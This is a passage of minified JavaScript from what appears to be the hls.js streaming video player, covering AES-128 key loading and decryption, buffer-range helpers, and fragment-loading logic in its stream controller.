Promise.reject(this.createKeyLoadError(e,H.KEY_LOAD_ERROR,new Error(`Key supplied with unsupported METHOD: "${r.method}"`)))}}loadKeyEME(e,t){const r={frag:t,keyInfo:e};return this.emeController&&this.config.emeEnabled&&(t=this.emeController.loadKey(r))?(e.keyLoadPromise=t.then((t=>(e.mediaKeySessionContext=t,r)))).catch((t=>{throw e.keyLoadPromise=null,t})):Promise.resolve(r)}loadKeyHTTP(r,a){const n=this.config,l=new n.loader(n);return a.keyLoader=r.loader=l,r.keyLoadPromise=new Promise(((s,o)=>{const i={keyInfo:r,frag:a,responseType:"arraybuffer",url:r.decryptdata.uri};var t={loadPolicy:t=n.keyLoadPolicy.default,timeout:t.maxLoadTimeMs,maxRetry:0,retryDelay:0,maxRetryDelay:0},e={onSuccess:(t,e,r,n)=>{var{frag:r,keyInfo:i,url:a}=r;if(!r.decryptdata||i!==this.keyUriToKeyInfo[a])return o(this.createKeyLoadError(r,H.KEY_LOAD_ERROR,new Error("after key load, decryptdata unset or changed"),n));i.decryptdata.key=r.decryptdata.key=new Uint8Array(t.data),r.keyLoader=null,i.loader=null,s({frag:r,keyInfo:i})},onError:(t,e,r,n)=>{this.resetLoader(e),o(this.createKeyLoadError(a,H.KEY_LOAD_ERROR,new Error(`HTTP Error ${t.code} loading key `+t.text),r,f({url:i.url,data:void 0},t)))},onTimeout:(t,e,r)=>{this.resetLoader(e),o(this.createKeyLoadError(a,H.KEY_LOAD_TIMEOUT,new Error("key loading timed out"),r))},onAbort:(t,e,r)=>{this.resetLoader(e),o(this.createKeyLoadError(a,H.INTERNAL_ABORTED,new Error("key loading aborted"),r))}};l.load(i,t,e)}))}resetLoader(t){var{frag:t,keyInfo:e,url:r}=t,n=e.loader;t.keyLoader===n&&(t.keyLoader=null,e.loader=null),delete this.keyUriToKeyInfo[r],n&&n.destroy()}}const Dr={length:0,start:()=>0,end:()=>0};class S{static isBuffered(t,e){try{if(t){var r=S.getBuffered(t);for(let t=0;t<r.length;t++)if(e>=r.start(t)&&e<=r.end(t))return!0}}catch(t){}return!1}static bufferInfo(e,r,n){try{if(e){var i=S.getBuffered(e),a=[];let t;for(t=0;t<i.length;t++)a.push({start:i.start(t),end:i.end(t)});return this.bufferedInfo(a,r,n)}}catch(t){}return{len:0,start:r,end:r,nextStart:void 0}}static bufferedInfo(e,r,n){r=Math.max(0,r),e.sort((function(t,e){return t.start-e.start||e.end-t.end}));let i=[];if(n)for(let t=0;t<e.length;t++){var a,s=i.length;s&&(a=i[s-1].end,e[t].start-a<n)?e[t].end>a&&(i[s-1].end=e[t].end):i.push(e[t])}else i=e;let l,o=0,u=r,h=r;for(let t=0;t<i.length;t++){var c=i[t].start,d=i[t].end;if(c<=r+n&&r<d)u=c,h=d,o=h-r;else if(r+n<c){l=c;break}}return{len:o,start:u||0,end:h||0,nextStart:l}}static getBuffered(t){try{return t.buffered}catch(t){return V.log("failed to get media.buffered",t),Dr}}}class Cr{constructor(t,e,r,n=0,i=-1,a=!1){this.level=void 0,this.sn=void 0,this.part=void 0,this.id=void 0,this.size=void 0,this.partial=void 0,this.transmuxing={start:0,executeStart:0,executeEnd:0,end:0},this.buffering={audio:{start:0,executeStart:0,executeEnd:0,end:0},video:{start:0,executeStart:0,executeEnd:0,end:0},audiovideo:{start:0,executeStart:0,executeEnd:0,end:0}},this.level=t,this.sn=e,this.id=r,this.size=n,this.part=i,this.partial=a}}function xr(r,n){let i=null;for(let t=0,e=r.length;t<e;t++){var a=r[t];if(a&&a.cc===n){i=a;break}}return i}function Or(t,e){t&&(e=t.start+e,t.start=t.startPTS=e,t.endPTS=e+t.duration)}function Mr(r,t){var n=t.fragments;for(let t=0,e=n.length;t<e;t++)Or(n[t],r);t.fragmentHint&&Or(t.fragmentHint,r),t.alignedSliding=!0}function Nr(t,e){var r,n,i;t.hasProgramDateTime&&e.hasProgramDateTime&&(r=t.fragments,e=e.fragments,r.length)&&e.length&&(r=xr(r,(e=e[Math.round(e.length/2)-1]).cc)||r[Math.round(r.length/2)-1],n=e.programDateTime,i=r.programDateTime,null!==n)&&null!==i&&Mr((i-n)/1e3-(r.start-e.start),t)}class Br{constructor(t,e){this.subtle=void 0,this.aesIV=void 0,this.subtle=t,this.aesIV=e}decrypt(t,e){return this.subtle.decrypt({name:"AES-CBC",iv:this.aesIV},e,t)}}class Ur{constructor(t,e){this.subtle=void 0,this.key=void 0,this.subtle=t,this.key=e}expandKey(){return this.subtle.importKey("raw",this.key,{name:"AES-CBC"},!1,["encrypt","decrypt"])}}class jr{constructor(){this.rcon=[0,1,2,4,8,16,32,64,128,27,54],this.subMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.invSubMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.sBox=new Uint32Array(256),this.invSBox=new Uint32Array(256),this.key=new Uint32Array(0),this.ksRows=0,this.keySize=0,this.keySchedule=void 0,this.invKeySchedule=void 0,this.initTable()}uint8ArrayToUint32Array_(t){var e=new DataView(t),r=new Uint32Array(4);for(let t=0;t<4;t++)r[t]=e.getUint32(4*t);return r}initTable(){var r,t=this.sBox,e=this.invSBox,n=(r=this.subMix)[0],i=r[1],a=r[2],s=r[3],o=(r=this.invSubMix)[0],l=r[1],u=r[2],h=r[3],c=new Uint32Array(256);let d=0,f=0,p=0;for(p=0;p<256;p++)c[p]=p<128?p<<1:p<<1^283;for(p=0;p<256;p++){var g=(g=f^f<<1^f<<2^f<<3^f<<4)>>>8^255&g^99,v=c[e[t[d]=g]=d],m=c[v],y=c[m],E=257*c[g]^16843008*g;n[d]=E<<24|E>>>8,i[d]=E<<16|E>>>16,a[d]=E<<8|E>>>24,s[d]=E,E=16843009*y^65537*m^257*v^16843008*d,o[g]=E<<24|E>>>8,l[g]=E<<16|E>>>16,u[g]=E<<8|E>>>24,h[g]=E,d?(d=v^c[c[c[y^v]]],f^=c[c[f]]):d=f=1}}expandKey(i){var a=this.uint8ArrayToUint32Array_(i);let t=!0,e=0;for(;e<a.length&&t;)t=a[e]===this.key[e],e++;if(!t){this.key=a;var s=this.keySize=a.length;if(4!==s&&6!==s&&8!==s)throw new Error("Invalid aes key size="+s);var o=this.ksRows=4*(s+6+1);let t,e;var l=this.keySchedule=new Uint32Array(o),u=this.invKeySchedule=new Uint32Array(o),h=this.sBox,c=this.rcon,d=(i=this.invSubMix)[0],f=i[1],p=i[2],g=i[3];let r,n;for(t=0;t<o;t++)t<s?r=l[t]=a[t]:(n=r,t%s==0?(n=h[(n=n<<8|n>>>24)>>>24]<<24|h[n>>>16&255]<<16|h[n>>>8&255]<<8|h[255&n],n^=c[t/s|0]<<24):6<s&&t%s==4&&(n=h[n>>>24]<<24|h[n>>>16&255]<<16|h[n>>>8&255]<<8|h[255&n]),l[t]=r=(l[t-s]^n)>>>0);for(e=0;e<o;e++)t=o-e,n=3&e?l[t]:l[t-4],u[e]=e<4||t<=4?n:d[h[n>>>24]]^f[h[n>>>16&255]]^p[h[n>>>8&255]]^g[h[255&n]],u[e]=u[e]>>>0}}networkToHostOrderSwap(t){return t<<24|(65280&t)<<8|(16711680&t)>>8|t>>>24}decrypt(t,e,r){var s,n=this.keySize+6,i=this.invKeySchedule,a=this.invSBox,o=(s=this.invSubMix)[0],l=s[1],u=s[2],h=s[3];let c=(s=this.uint8ArrayToUint32Array_(r))[0],d=s[1],f=s[2],p=s[3];var g,v,m,y,E=new Int32Array(t),T=new Int32Array(E.length);let b,A,_,S,L,k,R,w,I,D;for(var C=this.networkToHostOrderSwap;e<E.length;){for(g=C(E[e]),v=C(E[e+1]),m=C(E[e+2]),y=C(E[e+3]),L=g^i[0],k=y^i[1],R=m^i[2],w=v^i[3],I=4,D=1;D<n;D++)b=o[L>>>24]^l[k>>16&255]^u[R>>8&255]^h[255&w]^i[I],A=o[k>>>24]^l[R>>16&255]^u[w>>8&255]^h[255&L]^i[I+1],_=o[R>>>24]^l[w>>16&255]^u[L>>8&255]^h[255&k]^i[I+2],S=o[w>>>24]^l[L>>16&255]^u[k>>8&255]^h[255&R]^i[I+3],L=b,k=A,R=_,w=S,I+=4;b=a[L>>>24]<<24^a[k>>16&255]<<16^a[R>>8&255]<<8^a[255&w]^i[I],A=a[k>>>24]<<24^a[R>>16&255]<<16^a[w>>8&255]<<8^a[255&L]^i[I+1],_=a[R>>>24]<<24^a[w>>16&255]<<16^a[L>>8&255]<<8^a[255&k]^i[I+2],S=a[w>>>24]<<24^a[L>>16&255]<<16^a[k>>8&255]<<8^a[255&R]^i[I+3],T[e]=C(b^c),T[e+1]=C(S^d),T[e+2]=C(_^f),T[e+3]=C(A^p),c=g,d=v,f=m,p=y,e+=4}return T.buffer}}class Gr{constructor(t,{removePKCS7Padding:e=!0}={}){if(this.logEnabled=!0,this.removePKCS7Padding=void 0,this.subtle=null,this.softwareDecrypter=null,this.key=null,this.fastAesKey=null,this.remainderData=null,this.currentIV=null,this.currentResult=null,this.useSoftware=void 0,this.useSoftware=t.enableSoftwareAES,this.removePKCS7Padding=e)try{var r=self.crypto;r&&(this.subtle=r.subtle||r.webkitSubtle)}catch(t){}null===this.subtle&&(this.useSoftware=!0)}destroy(){this.subtle=null,this.softwareDecrypter=null,this.key=null,this.fastAesKey=null,this.remainderData=null,this.currentIV=null,this.currentResult=null}isSync(){return this.useSoftware}flush(){var t,e,{currentResult:r,remainderData:n}=this;return!r||n?(this.reset(),null):(n=new Uint8Array(r),this.reset(),this.removePKCS7Padding?(e=(t=(r=n).byteLength)&&new DataView(r.buffer).getUint8(t-1))?kt(r,0,t-e):r:n)}reset(){this.currentResult=null,this.currentIV=null,this.remainderData=null,this.softwareDecrypter&&(this.softwareDecrypter=null)}decrypt(n,i,a){return this.useSoftware?new Promise(((t,e)=>{this.softwareDecrypt(new Uint8Array(n),i,a);var r=this.flush();r?t(r.buffer):e(new Error("[softwareDecrypt] Failed to decrypt data"))})):this.webCryptoDecrypt(new Uint8Array(n),i,a)}softwareDecrypt(t,e,r){var a,{currentIV:n,currentResult:i,remainderData:a}=this;if(!(a=(this.logOnce("JS AES decrypt"),a&&(t=Yt(a,t),this.remainderData=null),this.getValidChunk(t))).length)return null;n&&(r=n);let s=this.softwareDecrypter;return(s=s||(this.softwareDecrypter=new jr)).expandKey(e),t=i,this.currentResult=s.decrypt(a.buffer,0,r),this.currentIV=kt(a,-16).buffer,t||null}webCryptoDecrypt(e,r,n){const i=this.subtle;return this.key===r&&this.fastAesKey||(this.key=r,this.fastAesKey=new Ur(i,r)),this.fastAesKey.expandKey().then((t=>i?(this.logOnce("WebCrypto AES decrypt"),new Br(i,new Uint8Array(n)).decrypt(e.buffer,t)):Promise.reject(new Error("web crypto not initialized")))).catch((t=>(V.warn(`[decrypter]: WebCrypto Error, disable WebCrypto API, ${t.name}: `+t.message),this.onWebCryptoError(e,r,n))))}onWebCryptoError(t,e,r){if(this.useSoftware=!0,this.logEnabled=!0,this.softwareDecrypt(t,e,r),t=this.flush())return t.buffer;throw new Error("WebCrypto and softwareDecrypt: failed to decrypt data")}getValidChunk(t){let e=t;var r=t.length-t.length%16;return r!==t.length&&(e=kt(t,0,r),this.remainderData=kt(t,r)),e}logOnce(t){this.logEnabled&&(V.log("[decrypter]: "+t),this.logEnabled=!1)}}const $r_toString=function(e){let r="";var n=e.length;for(let t=0;t<n;t++)r+=`[${e.start(t).toFixed(3)}-${e.end(t).toFixed(3)}]`;return r},L_STOPPED="STOPPED",L_IDLE="IDLE",L_KEY_LOADING="KEY_LOADING",L_FRAG_LOADING="FRAG_LOADING",L_FRAG_LOADING_WAITING_RETRY="FRAG_LOADING_WAITING_RETRY",L_WAITING_TRACK="WAITING_TRACK",L_PARSING="PARSING",L_PARSED="PARSED",L_ENDED="ENDED",L_ERROR="ERROR",L_WAITING_INIT_PTS="WAITING_INIT_PTS",L_WAITING_LEVEL="WAITING_LEVEL";class Kr extends class{constructor(){this._boundTick=void 0,this._tickTimer=null,this._tickInterval=null,this._tickCallCount=0,this._boundTick=this.tick.bind(this)}destroy(){this.onHandlerDestroying(),this.onHandlerDestroyed()}onHandlerDestroying(){this.clearNextTick(),this.clearInterval()}onHandlerDestroyed(){}hasInterval(){return!!this._tickInterval}hasNextTick(){return!!this._tickTimer}setInterval(t){return!this._tickInterval&&(this._tickCallCount=0,this._tickInterval=self.setInterval(this._boundTick,t),!0)}clearInterval(){return!(!this._tickInterval||(self.clearInterval(this._tickInterval),this._tickInterval=null))}clearNextTick(){return!(!this._tickTimer||(self.clearTimeout(this._tickTimer),this._tickTimer=null))}tick(){this._tickCallCount++,1===this._tickCallCount&&(this.doTick(),1<this._tickCallCount&&this.tickImmediate(),this._tickCallCount=0)}tickImmediate(){this.clearNextTick(),this._tickTimer=self.setTimeout(this._boundTick,0)}doTick(){}}{constructor(t,e,r,n,i){super(),this.hls=void 0,this.fragPrevious=null,this.fragCurrent=null,this.fragmentTracker=void 0,this.transmuxer=null,this._state=L_STOPPED,this.playlistType=void 0,this.media=null,this.mediaBuffer=null,this.config=void 0,this.bitrateTest=!1,this.lastCurrentTime=0,this.nextLoadPosition=0,this.startPosition=0,this.startTimeOffset=null,this.loadedmetadata=!1,this.retryDate=0,this.levels=null,this.fragmentLoader=void 0,this.keyLoader=void 0,this.levelLastLoaded=null,this.startFragRequested=!1,this.decrypter=void 0,this.initPTS=[],this.onvseeking=null,this.onvended=null,this.logPrefix="",this.log=void 0,this.warn=void 0,this.playlistType=i,this.logPrefix=n,this.log=V.log.bind(V,n+":"),this.warn=V.warn.bind(V,n+":"),this.hls=t,this.fragmentLoader=new Lr(t.config),this.keyLoader=r,this.fragmentTracker=e,this.config=t.config,this.decrypter=new Gr(t.config),t.on($.MANIFEST_LOADED,this.onManifestLoaded,this)}doTick(){this.onTickEnd()}onTickEnd(){}startLoad(t){}stopLoad(){this.fragmentLoader.abort(),this.keyLoader.abort(this.playlistType);var t=this.fragCurrent;null!=t&&t.loader&&(t.abortRequests(),this.fragmentTracker.removeFragment(t)),this.resetTransmuxer(),this.fragCurrent=null,this.fragPrevious=null,this.clearInterval(),this.clearNextTick(),this.state=L_STOPPED}_streamEnded(t,e){return!(e.live||t.nextStart||!t.end||!this.media)&&(null!=(t=e.partList)&&t.length?(t=t[t.length-1],S.isBuffered(this.media,t.start+t.duration/2)):(t=e.fragments[e.fragments.length-1].type,this.fragmentTracker.isEndListAppended(t)))}getLevelDetails(){var t;return this.levels&&null!==this.levelLastLoaded&&null!=(t=this.levels[this.levelLastLoaded])?t.details:void 0}onMediaAttached(t,e){e=this.media=this.mediaBuffer=e.media,this.onvseeking=this.onMediaSeeking.bind(this),this.onvended=this.onMediaEnded.bind(this),e.addEventListener("seeking",this.onvseeking),e.addEventListener("ended",this.onvended),e=this.config,this.levels&&e.autoStartLoad&&this.state===L_STOPPED&&this.startLoad(e.startPosition)}onMediaDetaching(){var t=this.media;null!=t&&t.ended&&(this.log("MSE detaching and video ended, reset startPosition"),this.startPosition=this.lastCurrentTime=0),t&&this.onvseeking&&this.onvended&&(t.removeEventListener("seeking",this.onvseeking),t.removeEventListener("ended",this.onvended),this.onvseeking=this.onvended=null),this.keyLoader&&this.keyLoader.detach(),this.media=this.mediaBuffer=null,this.loadedmetadata=!1,this.fragmentTracker.removeAllFragments(),this.stopLoad()}onMediaSeeking(){var{config:t,fragCurrent:e,media:r,mediaBuffer:n,state:i}=this,a=r?r.currentTime:0,n=S.bufferInfo(n||r,a,t.maxBufferHole);this.log(`media seeking to ${N(a)?a.toFixed(3):a}, state: `+i),this.state===L_ENDED?this.resetLoadingState():e&&(i=t.maxFragLookUpTolerance,t=e.start-i,i=e.start+e.duration+i,!n.len||i<n.start||t>n.end)&&(i=i<a,a<t||i)&&(i&&e.loader&&(this.log("seeking outside of buffer while fragment load in progress, cancel fragment load"),e.abortRequests(),this.resetLoadingState()),this.fragPrevious=null),r&&(this.fragmentTracker.removeFragmentsInRange(a,1/0,this.playlistType,!0),this.lastCurrentTime=a),this.loadedmetadata||n.len||(this.nextLoadPosition=this.startPosition=a),this.tickImmediate()}onMediaEnded(){this.startPosition=this.lastCurrentTime=0}onManifestLoaded(t,e){this.startTimeOffset=e.startTimeOffset,this.initPTS=[]}onHandlerDestroying(){this.stopLoad(),super.onHandlerDestroying()}onHandlerDestroyed(){this.state=L_STOPPED,this.fragmentLoader&&this.fragmentLoader.destroy(),this.keyLoader&&this.keyLoader.destroy(),this.decrypter&&this.decrypter.destroy(),this.hls=this.log=this.warn=this.decrypter=this.keyLoader=this.fragmentLoader=this.fragmentTracker=null,super.onHandlerDestroyed()}loadFragment(t,e,r){this._loadFragForPlayback(t,e,r)}_loadFragForPlayback(r,t,e){this._doFragLoad(r,t,e,(t=>{this.fragContextChanged(r)?(this.warn(`Fragment ${r.sn}${t.part?" p: "+t.part.index:""} of level ${r.level} was dropped during download.`),this.fragmentTracker.removeFragment(r)):(r.stats.chunkCount++,this._handleFragmentLoadProgress(t))})).then((t=>{var e;t&&(e=this.state,this.fragContextChanged(r)?e!==L_FRAG_LOADING&&(this.fragCurrent||e!==L_PARSING)||(this.fragmentTracker.removeFragment(r),this.state=L_IDLE):("payload"in t&&(this.log(`Loaded fragment ${r.sn} of level `+r.level),this.hls.trigger($.FRAG_LOADED,t)),this._handleFragmentLoadComplete(t)))})).catch((t=>{this.state!==L_STOPPED&&this.state!==L_ERROR&&(this.warn(t),this.resetFragmentLoading(r))}))}clearTrackerIfNeeded(t){var e,r=this.fragmentTracker;r.getState(t)===yr?(e=t.type,e=this.getFwdBufferInfo(this.mediaBuffer,e),e=Math.max(t.duration,e?e.len:this.config.maxBufferLength),this.reduceMaxBufferLength(e)&&r.removeFragment(t)):0===(null==(e=this.mediaBuffer)?void 0:e.buffered.length)?r.removeAllFragments():r.hasParts(t.type)&&(r.detectPartialFragments({frag:t,part:null,stats:t.stats,id:t.type}),r.getState(t)===Er)&&r.removeFragment(t)}checkLiveUpdate(t){var e;t.updated&&!t.live&&(e=t.fragments[t.fragments.length-1],this.fragmentTracker.detectPartialFragments({frag:e,part:null,stats:e.stats,id:e.type})),t.fragments[0]||(t.deltaUpdateFailed=!0)}flushMainBuffer(t,e,r=null){t-e&&(t={startOffset:t,endOffset:e,type:r},this.hls.trigger($.BUFFER_FLUSHING,t))}_loadInitSegment(a,i){this._doFragLoad(a,i).then((t=>{if(t&&!this.fragContextChanged(a)&&this.levels)return t;throw new Error("init load aborted")})).then((r=>{const n=this.hls;var t=r.payload,e=a.decryptdata;if(t&&0<t.byteLength&&e&&e.key&&e.iv&&"AES-128"===e.method){const i=self.performance.now();return this.decrypter.decrypt(new Uint8Array(t),e.key.buffer,e.iv.buffer).catch((t=>{throw n.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_DECRYPT_ERROR,fatal:!1,error:t,reason:t.message,frag:a}),t})).then((t=>{var e=self.performance.now();return n.trigger($.FRAG_DECRYPTED,{frag:a,payload:t,stats:{tstart:i,tdecrypt:e}}),r.payload=t,r}))}return r})).then((t=>{var{fragCurrent:e,hls:r,levels:n}=this;if(!n)throw new Error("init load aborted, missing levels");n=a.stats,this.state=L_IDLE,i.fragmentError=0,a.data=new Uint8Array(t.payload),n.parsing.start=n.buffering.start=self.performance.now(),n.parsing.end=n.buffering.end=self.performance.now(),t.frag===e&&r.trigger($.FRAG_BUFFERED,{stats:n,frag:e,part:null,id:a.type}),this.tick()})).catch((t=>{this.state!==L_STOPPED&&this.state!==L_ERROR&&(this.warn(t),this.resetFragmentLoading(a))}))}fragContextChanged(t){var e=this.fragCurrent;return!t||!e||t.level!==e.level||t.sn!==e.sn||t.urlId!==e.urlId}fragBufferedComplete(t,e){var r=this.mediaBuffer||this.media;this.log(`Buffered ${t.type} sn: ${t.sn}${e?" part: "+e.index:""} of ${this.playlistType===A?"level":"track"} ${t.level} (frag:[${(null!=(e=t.startPTS)?e:NaN).toFixed(3)}-${(null!=(e=t.endPTS)?e:NaN).toFixed(3)}] > buffer:${r?$r_toString(S.getBuffered(r)):"(detached)"})`),this.state=L_IDLE,r&&(!this.loadedmetadata&&t.type==A&&r.buffered.length&&(null==(e=this.fragCurrent)?void 0:e.sn)===(null==(t=this.fragPrevious)?void 0:t.sn)&&(this.loadedmetadata=!0,this.seekToStartPos()),this.tick())}seekToStartPos(){}_handleFragmentLoadComplete(t){var e,r,n=this.transmuxer;n&&(({frag:t,part:e,partsLoaded:r}=t),r=!r||0===r.length||r.some((t=>!t)),t=new Cr(t.level,t.sn,t.stats.chunkCount+1,0,e?e.index:-1,!r),n.flush(t))}_handleFragmentLoadProgress(t){}_doFragLoad(e,r,n=null,i){var a=null==r?void 0:r.details;if(!this.levels||!a)throw new Error(`frag load aborted, missing level${a?"":" detail"}s`);let s=null;if(!e.encrypted||null!=(o=e.decryptdata)&&o.key?!e.encrypted&&a.encryptedFragments.length&&this.keyLoader.loadClear(e,a.encryptedFragments):(this.log(`Loading key for ${e.sn} of [${a.startSN}-${a.endSN}], ${"[stream-controller]"===this.logPrefix?"level":"track"} `+e.level),this.state=L_KEY_LOADING,this.fragCurrent=e,s=this.keyLoader.load(e).then((t=>{if(!this.fragContextChanged(t.frag))return this.hls.trigger($.KEY_LOADED,t),this.state===L_KEY_LOADING&&(this.state=L_IDLE),t})),this.hls.trigger($.KEY_LOADING,{frag:e}),null===this.fragCurrent&&(s=Promise.reject(new Error("frag load aborted, context changed in KEY_LOADING")))),n=Math.max(e.start,n||0),this.config.lowLatencyMode&&"initSegment"!==e.sn){var o=a.partList;if(o&&i){n>e.end&&a.fragmentHint&&(e=a.fragmentHint);var l=this.getNextPart(o,e,n);if(-1<l){const h=o[l];let t;return this.log(`Loading part sn: ${e.sn} p: ${h.index} cc: ${e.cc} of playlist [${a.startSN}-${a.endSN}] parts [0-${l}-${o.length-1}] ${"[stream-controller]"===this.logPrefix?"level":"track"}: ${e.level}, target: `+parseFloat(n.toFixed(3))),this.nextLoadPosition=h.start+h.duration,this.state=L_FRAG_LOADING,t=s?s.then((t=>!t||this.fragContextChanged(t.frag)?null:this.doFragPartsLoad(e,h,r,i))).catch((t=>this.handleFragLoadError(t))):this.doFragPartsLoad(e,h,r,i).catch((t=>this.handleFragLoadError(t))),this.hls.trigger($.FRAG_LOADING,{frag:e,part:h,targetBufferTime:n}),null===this.fragCurrent?Promise.reject(new Error("frag load aborted, context changed in FRAG_LOADING parts")):t}if(!e.url||this.loadedEndOfParts(o,n))return Promise.resolve(null)}}this.log(`Loading fragment ${e.sn} cc: ${e.cc} ${a?"of ["+a.startSN+"-"+a.endSN+"] ":""}${"[stream-controller]"===this.logPrefix?"level":"track"}: ${e.level}, target: `+parseFloat(n.toFixed(3))),N(e.sn)&&!this.bitrateTest&&(this.nextLoadPosition=e.start+e.duration),this.state=L_FRAG_LOADING;const u=this.config.progressive;let t;return t=u&&s?s.then((t=>!t||this.fragContextChanged(null==t?void 0:t.frag)?null:this.fragmentLoader.load(e,i))).catch((t=>this.handleFragLoadError(t))):Promise.all([this.fragmentLoader.load(e,u?i:void 0),s]).then((([t])=>(!u&&t&&i&&i(t),t))).catch((t=>this.handleFragLoadError(t))),this.hls.trigger($.FRAG_LOADING,{frag:e,targetBufferTime:n}),null===this.fragCurrent?Promise.reject(new Error("frag load aborted, context changed in FRAG_LOADING")):t}doFragPartsLoad(o,r,l,u){return new Promise(((n,t)=>{var e;const i=[],a=null==(e=l.details)?void 0:e.partList,s=r=>{this.fragmentLoader.loadPart(o,r,u).then((t=>{var e=(i[r.index]=t).part;if(!(t=(this.hls.trigger($.FRAG_LOADED,t),ze(l,o.sn,r.index+1)||Qe(a,o.sn,r.index+1))))return n({frag:o,part:e,partsLoaded:i});s(t)})).catch(t)};s(r)}))}handleFragLoadError(t){var e;return"data"in t?(e=t.data,t.data&&e.details===H.INTERNAL_ABORTED?this.handleFragLoadAborted(e.frag,e.part):this.hls.trigger($.ERROR,e)):this.hls.trigger($.ERROR,{type:K.OTHER_ERROR,details:H.INTERNAL_EXCEPTION,err:t,error:t,fatal:!0}),null}_handleTransmuxerFlush(t){var e,r,n,i=this.getCurrentContext(t);i&&this.state===L_PARSING?(({frag:i,part:e,level:r}=i),n=self.performance.now(),i.stats.parsing.end=n,e&&(e.stats.parsing.end=n),this.updateLevelTiming(i,e,r,t.partial)):this.fragCurrent||this.state===L_STOPPED||this.state===L_ERROR||(this.state=L_IDLE)}getCurrentContext(t){var e,r,n,i,{levels:a,fragCurrent:s}=this,{level:t,sn:o,part:l}=t;return null!=a&&a[t]?(a=a[t],(i=(l=-1<l?ze(a,o,l):null)?l.fragment:(r=o,n=s,null!=(e=a)&&e.details?(i=(e=e.details).fragments[r-e.startSN])||((i=e.fragmentHint)&&i.sn===r?i:r<e.startSN&&n&&n.sn===r?n:null):null))?(s&&s!==i&&(i.stats=s.stats),{frag:i,part:l,level:a}):null):(this.warn(`Levels object was unset while buffering fragment ${o} of level ${t}. The current chunk will not be buffered.`),null)}bufferFragmentData(e,r,n,i,a){if(e&&this.state===L_PARSING){var{data1:s,data2:o}=e;let t=s;null!=(s=t=s&&o?Yt(s,o):t)&&s.length&&(o={type:e.type,frag:r,part:n,chunkMeta:i,parent:r.type,data:t},this.hls.trigger($.BUFFER_APPENDING,o),e.dropped)&&e.independent&&!n&&!a&&this.flushBufferGap(r)}}flushBufferGap(t){var e,r,n=this.media;n&&(S.isBuffered(n,n.currentTime)?(e=n.currentTime,n=S.bufferInfo(n,e,0),r=t.duration,r=Math.min(2*this.config.maxFragLookUpTolerance,.25*r),n=Math.max(Math.min(t.start-r,n.end-r),e+r),t.start-n>r&&this.flushMainBuffer(n,t.start)):this.flushMainBuffer(0,t.start))}getFwdBufferInfo(t,e){var r=this.getLoadPosition();return N(r)?this.getFwdBufferInfoAtPos(t,r,e):null}getFwdBufferInfoAtPos(t,e,r){var n=this.config.maxBufferHole,i=S.bufferInfo(t,e,n);return 0===i.len&&void 0!==i.nextStart&&(r=this.fragmentTracker.getBufferedFrag(e,r))&&i.nextStart<r.end?S.bufferInfo(t,e,Math.max(i.nextStart,n)):i}getMaxBufferLength(t){var e=this.config;let r;return r=t?Math.max(8*e.maxBufferSize/t,e.maxBufferLength):e.maxBufferLength,Math.min(r,e.maxMaxBufferLength)}reduceMaxBufferLength(t){var e=this.config;t=t||e.maxBufferLength;return e.maxMaxBufferLength>=t&&(e.maxMaxBufferLength/=2,this.warn(`Reduce max buffer length to ${e.maxMaxBufferLength}s`),!0)}getAppendedFrag(t,e=0){return(t=this.fragmentTracker.getAppendedFrag(t,A))&&"fragment"in t?t.fragment:t}getNextFragment(t,e){var r=e.fragments,n=r.length;if(!n)return null;var i=this.config,a=r[0].start;let s;if(e.live){var o=i.initialLiveManifestSize;if(n<o)return this.warn(`Not enough fragments to start playback (have: ${n}, need: ${o})`),null;e.PTSKnown||this.startFragRequested||-1!==this.startPosition||(s=this.getInitialLiveFragment(e,r),this.startPosition=s?this.hls.liveSyncPosition||s.start:t)}else t<=a&&(s=r[0]);return s||(n=i.lowLatencyMode?e.partEnd:e.fragmentEnd,s=this.getFragmentAtPosition(t,n,e)),this.mapToInitFragWhenRequired(s)}isLoopLoading(t,e){var r=this.fragmentTracker.getState(t);return(r===Tr||r===Er&&!!t.gap)&&this.nextLoadPosition>e}getNextFragmentLoopLoading(t,e,r,n,i){var a=t.gap;return null===(e=this.getNextFragment(this.nextLoadPosition,e))?e:(t=e,a&&t&&!t.gap&&r.nextStart&&null!==(e=this.getFwdBufferInfoAtPos(this.mediaBuffer||this.media,r.nextStart,n))&&r.len+e.len>=i?(this.log(`buffer full after gaps in "${n}" playlist starting at sn: `+t.sn),null):t)}mapToInitFragWhenRequired(t){return null==t||!t.initSegment||null!=t&&t.initSegment.data||this.bitrateTest?t:t.initSegment}getNextPart(r,n,i){let a=-1,s=!1,o=!0;for(let t=0,e=r.length;t<e;t++){var l=r[t];if(o=o&&!l.independent,-1<a&&i<l.start)break;var u=l.loaded;u?a=-1:(s||l.independent||o)&&l.fragment===n&&(a=t),s=u}return a}loadedEndOfParts(t,e){return(t=t[t.length-1])&&e>t.start&&t.loaded}getInitialLiveFragment(t,e){var r,n,i=this.fragPrevious;let a=null;return i?(t.hasProgramDateTime&&(this.log("Live playlist, switching playlist, load frag with same PDT: "+i.programDateTime),a=function nr(e,r,n){if(null!==r&&Array.isArray(e)&&e.length&&N(r)){var t=e[0].programDateTime;if(!(r<(t||0)||((t=e[e.length-1].endProgramDateTime)||0)<=r)){n=n||0;for(let t=0;t<e.length;++t){var i=e[t];if(function(t,e,r){return e=1e3*Math.min(e,r.duration+(r.deltaPTS||0)),t<(r=r.endProgramDateTime||0)-e}(r,n,i))return i}}}return null}(e,i.endProgramDateTime,this.config.maxFragLookUpTolerance)),a||((r=i.sn+1)>=t.startSN&&r<=t.endSN&&(r=e[r-t.startSN],i.cc===r.cc)&&(a=r,this.log("Live playlist, switching playlist, load frag with next SN: "+a.sn)),a)||(r=e,n=i.cc,(a=rr_search(r,(t=>t.cc<n?1:t.cc>n?-1:0)))&&this.log("Live playlist, switching playlist, load frag with same CC: "+a.sn))):null!==(e=this.hls.liveSyncPosition)&&(a=this.getFragmentAtPosition(e,this.bitrateTest?t.fragmentEnd:t.edge,t)),a}getFragmentAtPosition(t,e,r){var n=this.config;let i=this.fragPrevious,{fragments:a,endSN:s}=r;var o=r.fragmentHint,l=n.maxFragLookUpTolerance,u=r.partList;let 